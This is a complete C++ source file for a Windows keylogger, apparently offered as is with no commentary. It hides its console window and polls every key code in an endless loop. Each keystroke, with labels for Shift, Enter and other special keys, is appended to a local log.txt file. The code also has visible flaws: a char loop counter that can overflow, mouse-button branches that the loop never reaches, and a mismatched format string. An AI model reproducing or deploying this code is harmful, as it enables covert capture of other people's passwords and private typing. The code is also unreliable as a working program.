#include <iostream>
#include <Windows.h>

using namespace std;

int SaveFile(int key, char *file);

int main() {

    FreeConsole();
    char i;

    while (true) {
        for (i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i)){
                SaveFile(i, "log.txt");
            }
        }
    }

    return 0;
}

int SaveFile(int key, char *file) {

    cout << key << endl;
    
    FILE *output_file;

    output_file = fopen(file, "a+");

    if (key == VK_SHIFT){
        fprintf(output_file, "%s", " [SHIFT] ");
        fprintf(output_file, "%s", "\n");
    }


    else if (key == VK_BACK){
        fprintf(output_file, "%s", " [BACKSPACE] ");
        fprintf(output_file, "%s", "\n");
    }
    

    else if (key == VK_CONTROL){
        fprintf(output_file, "%s", " [CTRL] ");
        fprintf(output_file, "%s", "\n");
    }


    else if (key == VK_RETURN){
        fprintf(output_file, "%s", " [ENTER] ");
        fprintf(output_file, "%s", "\n");
    }
   

    else if (key == VK_TAB){
        fprintf(output_file, "%s", " [TAB] ");
        fprintf(output_file, "%s", "\n");
    }
     

    else if (key == VK_LBUTTON){
        fprintf(output_file, "%s", " [LMouseClick] ");
        fprintf(output_file, "%s", "\n");
    }
        

    else if (key == VK_RBUTTON){
        fprintf(output_file, "%s", " [RMouseClick] ");
        fprintf(output_file, "%s", "\n");
    }
      
    else {
        fprintf(output_file, "%s", &key);
        fprintf(output_file, "%s", "\n");
    }


    fclose(output_file);

    return 0;
}